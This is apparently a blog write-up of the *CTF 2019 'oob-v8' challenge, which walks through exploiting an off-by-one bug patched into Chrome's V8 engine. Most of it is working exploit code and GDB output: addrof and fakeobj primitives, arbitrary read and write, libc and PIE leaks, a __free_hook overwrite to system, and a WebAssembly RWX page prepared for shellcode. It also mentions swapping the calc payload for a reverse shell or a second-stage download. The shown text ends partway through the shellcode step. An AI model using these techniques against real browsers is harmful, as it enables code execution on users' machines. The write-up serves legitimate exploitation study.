---
layout: post
title:  "Exploiting v8: *CTF 2019 oob-v8"
date:   2019-12-13 23:30:00 +0800
categories: pwn
tags: *CTF-2019
---

# Introduction

I've recently been researching browsers, specifically JavaScript Engine exploitation in Chrome's v8. Being a CTF player myself, I thought doing a fairly recent CTF challenge might help me wrap my head around some of the exploitation techniques that are widely used provided a vulnerability ***does*** exist.

I picked the challenge `oob-v8` from `*CTF 2019`, because it seems as though all the writeups for it are fairly incomplete. They either assume a bunch of prerequisite knowledge, or just don't explain things well. I spent a lot of time debugging and understanding every part of my exploit, and popped calc in two separate ways.

The other reason I wanted to create this writeup is because most of the prerequisite knowledge required is scattered around a bunch of different places. I wanted to bring together all of that information in a single post, so that the reader will not need to read from multiple sources to understand the writeup.

If you have any questions about anything in this writeup, feel free to DM me through Twitter [@farazsth98](https://twitter.com/farazsth98). DMs will always be open.

## Prerequisite Knowledge

The only prerequisite knowledge required to understand this writeup will be an understanding of how Linux userspace exploitation works. You will need to know your way around GDB. Knowledge of JavaScript will more than likely not be required as you can learn along the way if you so choose. The MDN documentation is very good.

## Building d8

`d8` is the name given to the JavaScript REPL created by Google for v8. I will build both the release and debug versions of it.

For reference, I am doing all of this on an Ubuntu 18.04.3 LTS vm.

You will first have to install Google's `depot_tools` and add the folder to your PATH by following the guide [here](https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up):
```sh
pwn@ubuntu:~/tools$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
pwn@ubuntu:~/tools$ echo "export PATH=/home/pwn/tools/depot_tools:$PATH" >> ~/.bashrc
```

Next, download the challenge archive from [here](https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz). You will only need the `oob.diff` file from inside it. Run the following commands to download and build the correct version of d8:
```sh
pwn@ubuntu:~$ fetch v8
pwn@ubuntu:~$ cd v8
pwn@ubuntu:~/v8$ ./build/install-build-deps.sh # Assumes you're using apt
pwn@ubuntu:~/v8$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
pwn@ubuntu:~/v8$ gclient sync
pwn@ubuntu:~/v8$ git apply ../oob.diff
pwn@ubuntu:~/v8$ ./tools/dev/v8gen.py x64.release
pwn@ubuntu:~/v8$ ninja -C ./out.gn/x64.release # Release version
pwn@ubuntu:~/v8$ ./tools/dev/v8gen.py x64.debug
pwn@ubuntu:~/v8$ ninja -C ./out.gn/x64.debug # Debug version
```

The builds will take a while, but afterwards, you will find the release build in `v8/out.gn/x64.release/d8`, and the debug build in `v8/out.gn/x64.debug/d8`.

## The patch

First, let's take a brief look at the patch file. You don't have to understand every single line of code (the v8 code base is huge after all), but you should be able to find the vulnerability fairly quickly:
```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

Let's break it down a little bit:

* The two lines of code added in `src/bootstrapper.cc` essentially installs a builtin function for arrays called `oob`.
* The lines of code added in `src/builtins/builtins-definitions.h` and `src/compiler.typer.cc` are not important. They are required to add this builtin function correctly.
* The lines of code added into `src/builtins/builtins-array.cc` are important. The vulnerability lies here. 

I urge the reader to take a look at the code added to `src/builtins/builtins-array.cc` and try to spot the vulnerability. Even without any further context, it should be easy to spot.

* The function will initially check if the number of arguments is greater than 2 (the first argument is always the `this` argument). If it is, it returns undefined.
* If there is only one argument (`this`), it will cast the array into a `FixedDoubleArray` before returning the element at `array[length]`.
* If there are two arguments (`this` and `value`), it will write `value` as a float into `array[length]`.

Now, since arrays start with index 0, it is evident that `array[length]` results in an out-of-bounds access by one index at the end of the array. 

The question now is, how do we exploit it? In order to figure out what we can do with this vulnerability, we first have to find out what exists past an array's last index.

## Pointer tagging

Before we try to answer the question of what exists past the end of an array, I should explain that v8 uses a pointer tagging mechanism to distinguish between **pointers**, **doubles**, and **Smis**, which stands for `immediate small integer`. This information can be found in `src/objects.h`. Essentially, we have the following scenario:
```c
Double: Shown as the 64-bit binary representation without any changes
Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
```

There is a little more to this, especially when TypedArrays are involved, but I will cover that later when it is relevant. I mention this now because examining any addresses in GDB will require you to subtract 1 from the address before examination (to mask off the last bit). You will see this in action whenever I examine memory addresses in GDB.

The other important thing to note here is that any information leaks you get will be output in a floating point representation, since they have to be output as their 64-bit binary representation. V8 just doesn't have a way to express 64-bit integers normally. You will see the floating point information leaks in action further below, but as for right now, we need some way to convert those floating point values into hexadecimal addresses so we can use them easily in GDB.

I use the following code to do the conversions:
```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

Essentially, you create an 8 byte `ArrayBuffer` and create two TypedArrays that share this buffer, a `Float64Array` and a `Uint32Array`. You then have two functions:
1. `ftoi` takes in a float value and converts it into a `BigInt` value, taking care of little endianness as well. You can print this as a hex representation by doing something like the following: `"0x" + ftoi(val).toString(16)`
2. `itof` takes in a BigInt value and converts it into a float value. This is used when you want to write an address to memory (you can't simply write a BigInt value into memory. There is a way write integers using an `ArrayBuffer` and a `DataView` object, but in order to get to that stage, you have to first do direct floating point writes. More on this later).

Put the above code into a file, say `file.js`. You can run `d8` with it like `./d8 --shell ./file.js` to get access to the functions through the REPL.

## What exists past the end of an array?

There are two ways you can figure this out. The much harder way is to go to [https://source.chromium.org](https://source.chromium.org) and try to find the layout of an array by reading the source code. However, that requires you to already have a deep understanding of the v8 code base. Since pointers are tagged, it means that v8 cannot just let the compiler define the in-memory layout of Objects. It is entirely done within the source code, and if you don't know where to look / don't understand the different parts of the code base, you will not be able to figure out the layout of an array by reading the source code.

Instead, let us use the fact that we can build a debug version of `d8` and run it through a debugger to view the memory layout of an array in real time. Note that you have to run `d8` with `./d8 --allow-natives-syntax` to get access to some of the debugging functions, such as `%DebugPrint()`.
```
pwn@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./d8...done.

gef➤  run --allow-natives-syntax
Starting program: /home/pwn/v8/v8/out.gn/x64.debug/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff30ec700 (LWP 12183)]
V8 version 7.5.0 (candidate)

d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
DebugPrint: 0x1dbbe77cdd79: [JSArray]
 - map: 0x11304a782ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x384656691111 <JSArray[0]>
 - elements: 0x1dbbe77cdd59 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x172dc3640c71 <FixedArray[0]> {
    #length: 0x075e9d5801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x1dbbe77cdd59 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x11304a782ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x11304a782e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x075e9d580609 <Cell value= 1>
 - instance descriptors #1: 0x384656691f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x384656691eb9 <TransitionArray[4]>Transition array #1:
     0x172dc3644ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x11304a782f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x384656691111 <JSArray[0]>
 - constructor: 0x384656690ec1 <JSFunction Array (sfi = 0x75e9d58aca1)>
 - dependent code: 0x172dc36402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2]
```

That is a lot of information. Lets just view the array in memory. Remember, pointers are tagged and will require you to subtract 1 from them before examining:
```
gef➤  x/4gx 0x1dbbe77cdd79-1
0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 <-- JSArray
0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
```

Now, corroborating with the debug information given to us, we know that the first address corresponds to this array's `Map`. The second address corresponds to the array's `properties`. The third address corresponds to this array's `elements`, which is defined as a `FixedDoubleArray[2]`. We can see the `elements` pointer points to a memory address that is just before this array. Viewing the `elements` now, we find this:
```
gef➤  x/10gx 0x00001dbbe77cdd59-1  <- access the elements pointer
0x1dbbe77cdd58:	0x0000172dc36414f9	0x0000000200000000 <-- FixedDoubleArray
0x1dbbe77cdd68:	0x3ff199999999999a	0x400199999999999a
0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 <-- JSArray
0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
0x1dbbe77cdd98:	0x0000172dc3640941	0x00000adc678412a2
gef➤  p/f 0x3ff199999999999a
$1 = 1.1000000000000001
gef➤  p/f 0x400199999999999a
$2 = 2.2000000000000002
```

So, `var a` is a `JSArray`, and it's `elements` pointer points to a `FixedDoubleArray` (which has its own `Map`) at `&JSArray-0x30` with the array values inlined starting from `elements[2]`. The `0x0000000200000000` is an `Smi` that corresponds to the `FixedDoubleArray`'s length (2 in this case, because remember, an `Smi` will be `value << 32`).

We can finally answer the question of "What exists past the end of an array?". If we access `a.oob()`, it will access the `Map` of the `JSArray`, since that is what comes immediately after the last index of the `FixedDoubleArray`.

Let's test this out. We cannot just do `a.oob()` on the debug version, as the debug version has runtime assertions that prevent out of bounds accesses (it helps fuzzers catch out of bounds accesses, amongst other things). We can see the effect of `a.oob()` on the release version:
```
gef➤  run --allow-natives-syntax --shell ./pwn.js 
Starting program: /home/pwn/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell ./util.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff661c700 (LWP 2334)]
V8 version 7.5.0 (candidate)

d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
0x207f7ce4e139 <JSArray[2]>
[1.1, 2.2]
d8> a.oob();         
2.8870439231963e-311  <- As explained, we get a floating point representation
d8> "0x" + ftoi(a.oob()).toString(16);
"0x55088482ed9"

gef➤  x/4gx 0x207f7ce4e139-1
0x207f7ce4e138:	0x0000055088482ed9	0x00001c26fc480c71
0x207f7ce4e148:	0x0000207f7ce4e119	0x0000000200000000
```

As you can see, `a.oob()` returns `0x55088482ed9`, which is the same value as the Map of `a` (remember the Map is the very first address when examining `a` in memory). We used `ftoi` to convert the floating point information leak (the address of the Map) to a hexadecimal representation.

## What is a Map?

Now that we know we have the ability to overwrite a `JSArray`'s `Map`, we have to understand what a map is in order to figure out how we can exploit this vulnerability.

This section will only briefly cover what a Map is. [saelo](https://twitter.com/5aelo) covers this in much greater depth in his phrack paper [here](http://www.phrack.org/papers/jit_exploitation.html). I urge the reader to read that if required.

saelo's phrack paper says the following:
>The Map of an object (arrays are objects) is a data structure that contains information such as:
>* The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, ...
>* The size of the object in bytes
>* The properties of the object and where they are stored
>* The type of the array elements, e.g. unboxed doubles or tagged pointers
>* The prototype of the object if any
>
>While the property names are usually stored in the Map, the property values are stored within the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.

Essentially, the Map defines how an object should be accessed. Whether you access an object by doing `object["field"]`, or you access an array by doing `array[index]`, the Map of that object / array will tell the JS engine where to find that specific element in memory. The reason Maps are used in the first place is because looking up values is very expensive. Maps act as a sort of dictionary. Multiple objects / arrays can share the same map if they have the same layout. Again, check out saelo's phrack paper for more details.

For example, remember the `JSArray` from above? If you try to access `a[0]`, the Map of the `JSArray` would tell the JS engine to go to the array, access its `elements` pointer, and return the value at `elements[2]` as that corresponds to the value at index 0 of `1.1` (Scroll up if this doesn't make sense).

Remember that we have the ability to overwrite an array's `Map` with one of our own. In this way, we can cause a type confusion within the JS engine if we overwrite one array's map with the map of a different array. 

In order to see how we can abuse this, let us see what a different array's map looks like. Let us take an array of Objects:
```
d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> %DebugPrint(obj);
0x21885d38e0d9 <Object map = 0x17d0ea80ab39>
{A: 1.1}
d8> %DebugPrint(obj_arr);
0x21885d390561 <JSArray[1]>
[{A: 1.1}]

gef➤  x/4gx 0x21885d390561-1
0x21885d390560:	0x000017d0ea802f79	0x0000099148780c71
0x21885d390570:	0x000021885d390549	0x0000000100000000
gef➤  x/4gx 0x000021885d390549-1 <- access elements pointer
0x21885d390548:	0x0000099148780801	0x0000000100000000
0x21885d390558:	0x000021885d38e0d9	0x000017d0ea802f79
```

As you can see, the `Map` of an array of objects is a little different. Where the float array had a float value at index 0, the object array has the address of the actual `obj` in the same place. If you attempt to access `obj_arr[0]`, it will not just print out the floating point representation of the the memory address of `obj` at index 0, but it will somehow parse it and print `{A: 1.1}`.

So, what happens if we leak the map of a float array and overwrite the object array's map with it? Instead of treating index 0 as a memory address, it should just treat it as a float value. Accessing index 0 should then leak the address of `obj` as a float, right?
```
d8> var float_arr_map = float_arr.oob();
undefined
d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> obj_arr.oob(float_arr_map); <- overwrite obj_arr's map
undefined
d8> "0x" + ftoi(obj_arr[0]).toString(16);
"0x3541b65506a9"
d8> %DebugPrint(obj);
0x3541b65506a9 <Object map = 0x391a4148ab39>
{A: 1.1}
```

Success! In JS engine exploitation terminology, this is what is called an `addrof` primitive. The inverse of this (if we put a memory address at index 0 of our float array and change its map to that of the object array) is called a `fakeobj` primitive, as it allows you to place a fake object anywhere in memory in order to read from and write to it. We can place this fake object in a memory region where we can control it's Map and `elements` pointer, so we can easily read from and write to arbitrary memory addresses.

For now, we can add these to our `exploit.js` script as the `addrof` and `fakeobj` functions, as follows:
```javascript
/// Construct addrof primitive
var temp_obj = {"A":1};
var temp_obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    temp_obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    temp_obj_arr.oob(map2);

    // Get the address by accessing index 0
    let addr = temp_obj_arr[0];

    // Set the map back
    temp_obj_arr.oob(map1);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}
```

## Getting arbitrary read / write

We have the `addrof` and `fakeobj` primitives now. From here, the arbitrary read primitive is easy, but the arbitrary write primitive requires a little bit more work. Let's start with the arbitrary read primitive.

In order to perform arbitrary reads, what we need to do is create a float array with four elements where the 0th index is set to a value of a float array's map. That way, if we place a fake object right on top of where that map is, the 2th index of the float array will be treated as the fake object's `elements` pointer. This can then be used to perform reads at arbitrary addresses. Here is an example:
```
d8> var a = [1.1, 1.2, 1.3, 1.4];
undefined
d8> %DebugPrint(a);
0x18eaf2e4ddb1 <JSArray[4]>
[1.1, 1.2, 1.3, 1.4]

10gx 0x18eaf2e4ddb1-1-0x30
0x18eaf2e4dd80:	0x000036946f4814f9	0x0000000400000000 <- FixedDoubleArray
0x18eaf2e4dd90:	0x3ff199999999999a	0x3ff3333333333333
0x18eaf2e4dda0:	0x3ff4cccccccccccd	0x3ff6666666666666
0x18eaf2e4ddb0:	0x0000265b96342ed9	0x000036946f480c71 <- JSArray
0x18eaf2e4ddc0:	0x000018eaf2e4dd81	0x0000000400000000

elements == 0x000018eaf2e4dd81
index 0 == 0x18eaf2e4dd90 == elements + 0x10 (ignoring the last bit)

Assume we put a fake object at 0x18eaf2e4dd90. 

If we set index 0 to the float array's map, then index 2 (at 0x18eaf2e4dda0)
will be treated as the elements pointer for our fake object.

We can then read fake_object[0], and it will read whatever value is at
elements + 0x10
```

Here is an actual worked example, using our `fakeobj` primitive from before:
```
d8> var a = [1.1, 1.2, 1.3, 1.4];
undefined
d8> var float_arr = [1.1, 1.2, 1.3, 1.4];
undefined
d8> var float_arr_map = float_arr.oob();
undefined
d8> var crafted_arr = [float_arr_map, 1.2, 1.3, 1.4];
undefined
d8> "0x"+addrof(crafted_arr).toString(16);
"0x7be69511d69"

Right now, this is what it looks like in memory, the JSArray elements pointer
points to the FixedDoubleArray:

gef➤  x/10gx 0x7be69511d69-0x30-1
0x7be69511d38:	0x000016d74fa414f9	0x0000000400000000 <- FixedDoubleArray
0x7be69511d48:	0x000031adb41c2ed9	0x3ff3333333333333 <- We want our fake object here
0x7be69511d58:	0x3ff4cccccccccccd	0x3ff6666666666666
0x7be69511d68:	0x000031adb41c2ed9	0x000016d74fa40c71 <- JSArray
0x7be69511d78:	0x000007be69511d39	0x0000000400000000

Right now, if we place a fake object at 0x7be69511d48, we can control the value at
0x7be69511d48, which would be the fake object's elements pointer. This only works because
we set the Map to be that of a float array. A different object map would not work here as
it may not treat the value at 0x7be69511d48 as the elements pointer.

d8> var fake = fakeobj(addrof(crafted_arr)-0x20n);
undefined
d8> crafted_arr[2] = itof(BigInt(0x7be69511d38)-0x10n+1n);
4.206668633923e-311
d8> "0x"+ftoi(fake[0]).toString(16);
0x16d74fa414f9

As seen, we have successfully read the value at our arbitrary address of 0x7be69511d38
```

This is how we can use our `fakeobj` primitive to get an arbitrary read. In the same way, we can get an arbitrary write, however this won't exactly work out of the box, so lets call the arbitrary write function `initial_arb_write` instead:
```javascript
// This array is what we will use to read from and write to arbitrary memory addresses
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0)
	addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to read_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Index 0 will then return the value at read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to write_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0 as a floating point value
    fake[0] = itof(BigInt(val));
}
```

So why wouldn't the arbitrary write work? I don't exactly know why, but it just doesn't work with some certain addresses (if someone could explain to me why this is the case, I'd be grateful. Please DM me on twitter).

Let's take an example:
```
gef➤  p &__free_hook
$1 = (void (**)(void *, const void *)) 0x7f5c5ecf58e8 <__free_hook>
gef➤  p &system
$2 = (int (*)(const char *)) 0x7f5c5e957440 <__libc_system>
gef➤  c
Continuing.

d8> initial_arb_write(0x7f5c5ecf58e8, 0x7f5c5e957440);

<Program segfaults right here>
```

Now, I don't exactly know why this occurs, and I haven't found an explanation when I looked online. However, I do know that the real way to get an arbitrary write primitive is to overwrite the backing store of an `ArrayBuffer` with the address you want to write to. Then, using a `DataView` object to write to the `ArrayBuffer` will write to your overwritten address. If you've never coded in JavaScript before (like me), the MDN documentation for `ArrayBuffer` and `DataView` explains how to use them together.

The backing store of an `ArrayBuffer` can be thought of as the same as the `elements` pointer of a `JSArray`. It is found at offset `&ArrayBuffer+0x20`, which you can find out by using the x64.debug version of `d8`. The idea is that instead of using a `fakeobj` to write directly to an arbitrary address, we use the `fakeobj` to do our `initial_arb_write` and modify the backing store of a legitimate `ArrayBuffer` to our arbitrary address. Following this, we can use `dataview.setBigUint64(0, val, true)` to write our `val` as a little-endian 64 bit value to our arbitrary address. This is shown below:
```
gef➤  p &__free_hook
$3 = (void (**)(void *, const void *)) 0x7fb610ed08e8 <__free_hook>
gef➤  p &system
$4 = (int (*)(const char *)) 0x7fb610b32440 <__libc_system>
gef➤  c

d8> var buf = new ArrayBuffer(8);
undefined
d8> var dataview = new DataView(buf);
undefined
d8> var buf_addr = addrof(buf);
undefined
d8> var backing_store_addr = buf_addr+0x20n
undefined

// Overwrite backing store to &__free_hook
d8> initial_arb_write(backing_store_addr, 0x7fb610ed08e8);
undefined
d8> dataview.setBigUint64(0, BigInt(0x7fb610b32440), true);
undefined
sh: 1: undefined: not found

gef➤  x/gx &__free_hook
0x7fb610ed08e8 <__free_hook>:	0x00007fb610b32440
```

As you can see, we have successfully overwritten `__free_hook` with `&system`. We can chuck this whole thing into a function now as well:
```javascript
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}
```

## Exploitation Technique 1: Overwrite `__free_hook` to `system`

The first way we can get arbitrary code execution is to overwrite `__free_hook` with `system` (as shown above). Then, if we do something as simple as `console.log("xcalc");`, it will allocate some memory for the string `"xcalc"` and then free it, which will cause a call to `system("xcalc");`, thus popping calc.

To do this though, we need some leaks. Note that I am on Ubuntu 18.04.3 LTS, so my offsets for leaks will be different to yours. This is simply the same as Linux userspace exploitation now, so I won't go into too much detail.

What I noticed (through rigorous trial and error) was that if you allocate a native `JSArray` and leak it's Map, the Map points to an address in an mmapped region of memory. Near the base of this mmapped region of memory lies a heap pointer, and this heap pointer points to a PIE address. This way, we can get a PIE leak, get the PIE base address, and then get the Libc base address by using the global offset table, as follows:
```javascript
var test = new Array([1.1, 1.2, 1.3, 1.4]);

var test_addr = addrof(test);
var map_ptr = arb_read(test_addr - 1n);
var map_sec_base = map_ptr - 0x2f79n;
var heap_ptr = arb_read(map_sec_base + 0x18n);
var PIE_leak = arb_read(heap_ptr);
var PIE_base = PIE_leak - 0xd87ea8n;

console.log("[+] test array: 0x" + test_addr.toString(16));
console.log("[+] test array map leak: 0x" + map_ptr.toString(16));
console.log("[+] map section base: 0x" + map_sec_base.toString(16));
console.log("[+] heap leak: 0x" + heap_ptr.toString(16));
console.log("[+] PIE leak: 0x" + PIE_leak.toString(16));
console.log("[+] PIE base: 0x" + PIE_base.toString(16));

puts_got = PIE_base + 0xd9a3b8n;
libc_base = arb_read(puts_got) - 0x809c0n;
free_hook = libc_base + 0x3ed8e8n;
system = libc_base + 0x4f440n;

console.log("[+] Libc base: 0x" + libc_base.toString(16));
console.log("[+] __free_hook: 0x" + free_hook.toString(16));
console.log("[+] system: 0x" + system.toString(16));
```

Next, we just overwrite `__free_hook` with `&system` and call `console.log("xcalc")`. You can replace `"xcalc"` with anything, such as a reverse shell, or a call `wget` to download a second stage payload to perform a sandbox escape, etc.
```javascript
console.log("[+] Overwriting __free_hook to &system");
arb_write(free_hook, system);

console.log("xcalc")
```

![Popping calc using __free_hook](/images/oob-v8/calc_popped_free_hook.png)

You can find the final exploit script at the end of this blog post.

## Exploitation Technique 2: Use WebAssembly to create an RWX page

Although the previous technique works well, it is very CTF like, usually used to read a single flag file, or etc, and only works on UNIX style machines. If we could somehow execute our own shellcode, it would give us much more control over the code that we can execute. It will also let us target multiple operating systems simply by just changing the shellcode.

**Update**: As a side note, now that I've gotten my exploit to work through Chrome, it seems like the WebAssembly route is more reliable than the `__free_hook` route. The `__free_hook` route just does not want to work through Chrome. I suspect it is because of the way I leaked the addresses. Perhaps when ran through chrome, the leaks just don't exist at those offsets anymore. I'd investigate further but it is really hard to debug with the Chrome binary. Maybe I'll do it at a later date and update this writeup.

With other browsers like Firefox and Safari, you can cause a function to become "hot" and get JIT compiled, which results in the creation of an RWX JIT page which you can overwrite with your own shellcode. However, in Chrome, this exploitation technique was mitigated in early 2018. JIT pages are switched between RW and RX as required. They are never RWX.

The only other way (that I know of) to get an RWX page in v8 is to use WebAssembly. If you create a wasm function, it will allocate an RWX page whose address can be leaked. Let's first create a wasm page. Note that the wasm code used doesn't matter so long as it compiles and creates an RWX page for us:
```javascript
// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
```

Now, checking the memory mappings in GDB, you will see an `rwx` page has been created.

In order to figure out how you can leak the address of this page though, you can take the harder route and read the code in `src/compiler/wasm-compiler.cc` and the other various files, which is quite time consuming, but good practice to understand how the v8 code base works. 

I instead took a shortcut used the x64.debug version to figure this out:

1. Since I use `gdb-gef`, the first thing I did was take the base address of the RWX region, and do `search-pattern rwx_base_address` to see where it occurs in memory.
2. Through a bit of trial and error, I found that if you take `addrof(wasm_instance)`, the memory location at which `search-pattern` shows the `rwx_base_address` is always exactly at `addrof(wasm_instance)-1n+0x88n`.

This way, if you just do `arb_read(addrof(wasm_instance)-1n+0x88n)`, it will give you the base address of the RWX page, as shown below:
```javascript
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
```

Following this, I just had to copy my shellcode to the RWX page, and just call the wasm function by doing `f();`. I decided to use the following shellcode from [here](https://xz.aliyun.com/t/5003) that pops xcalc on Linux. I also wrote a helper function to help copy it over to the RWX page:
```javascript
function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}

